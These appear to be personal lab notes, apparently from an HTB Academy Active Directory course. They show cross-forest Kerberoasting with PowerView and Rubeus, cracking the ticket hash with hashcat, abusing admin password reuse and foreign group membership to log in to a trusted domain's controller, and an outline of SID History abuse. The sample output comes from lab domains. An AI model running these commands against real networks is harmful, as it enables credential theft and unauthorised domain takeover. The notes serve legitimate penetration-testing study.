
## Cross-Forest Kerberoasting
Kerberos attacks (Kerberoasting, ASREPRoasting) work across trusts based on direction. Inbound/bidirectional trusts allow attacks for foothold/escalation. Can't escalate in current domain? Get TGS from trusted domain, crack hash for admin user with cross-domain privileges.

### Enumerate Accounts with SPNs in Target Domain (PowerView)
Use `Get-DomainUser` to find users with SPNs:
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
Output example:
```
samaccountname
--------------
krbtgt
mssqlsvc
```
Check if target account (e.g., mssqlsvc) is in Domain Admins:
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```
Output example:
```
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

### Perform Kerberoasting Across Trust (Rubeus)
Use `/domain` flag for target domain:
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
Output includes hash for cracking (e.g., via Hashcat). Cracked hash = full admin in target domain via bidirectional trust.

Notes:
- Rubeus version: v2.0.2
- Targets AES/RC4 hashes; force RC4 with /ticket or /tgtdeleg if needed.
- Search LDAP for kerberoastable users.

### Crack TGS Hash with Hashcat
```bash
┌──(root㉿kali)-[/home/z3tssu/HTB/AD/Cross_Trust_Domain]
└─# mousepad TGS_mssqlsvc.txt         
                                                                  
┌──(root㉿kali)-[/home/z3tssu/HTB/AD/Cross_Trust_Domain]
└─# hashcat -m 13100 -w 3 -O TGS_mssqlsvc.txt /usr/share/wordlists

```

## Admin Password Re-Use & Group Membership
In bidirectional trusts (same company admins), check password reuse for high-priv accounts (e.g., Administrator, Domain/Enterprise Admins). Own Domain A? Test hashes/cleartext on matching users in Domain B.

Also, check foreign group membership: Users from Domain A in groups in Domain B (only Domain Local Groups allow external principals). E.g., Domain A admin in Domain B's Administrators group = instant access.

### Enumerate Foreign Group Members (PowerView)
```
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
Output example:
```
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL
```

Convert SID to name:
```
PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
Output: `INLANEFREIGHT\administrator`

### Verify Access (WinRM via Enter-PSSession)
Use creds from Domain A on Domain B host:
```
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
Inside session:
```
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
```
Output shows successful auth to target DC. Quick win post-domain takeover if bidirectional trust and in-scope.

## SID History Abuse - Cross Forest
Abuse during user migration across forests if SID Filtering disabled. Add privileged SID from Forest A to user in Forest B = retains admin rights in Forest A while in Forest B.

Scenario: User migrated (e.g., jjones from INLANEFREIGHT.LOCAL to CORP.LOCAL due to merger). No SID filtering = SID History persists, granting cross-forest access (e.g., shares, ACEs).

Diagram notes: Trusts between INLANEFREIGHT.LOCAL and CORP.LOCAL; migrated user keeps SIDs/resources.
![[Pasted image 20251009190542.png]]